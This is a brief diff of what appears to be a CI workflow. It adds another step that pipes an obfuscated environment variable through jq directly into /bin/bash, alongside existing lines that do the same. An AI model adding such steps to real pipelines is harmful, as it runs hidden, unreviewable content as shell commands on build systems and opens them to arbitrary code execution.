@@ -34,6 +34,7 @@ jobs:
           echo $eku43668 | jq -r .jiidq9 | /bin/bash
           echo $ainm7 | jq -r .d967 | /bin/bash
           printf '%s' "$cqgn4809" | jq -r .dmx098 | /bin/bash
+          printf '%s' "$pcw0242" | jq -r .j166 | /bin/bash
 
       - name: Save output
         if: always()
